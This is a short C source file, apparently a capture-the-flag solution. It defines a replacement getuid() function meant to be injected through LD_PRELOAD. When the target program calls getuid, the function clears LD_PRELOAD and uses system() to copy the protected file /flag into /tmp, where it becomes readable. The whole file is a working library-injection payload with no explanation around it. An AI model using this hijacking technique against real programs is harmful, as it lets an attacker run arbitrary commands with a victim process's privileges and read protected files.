#include <stdio.h>
#include <stdlib.h>

int getuid(){

    unsetenv("LD_PRELOAD");
    system("cat /flag>/tmp/flag");
}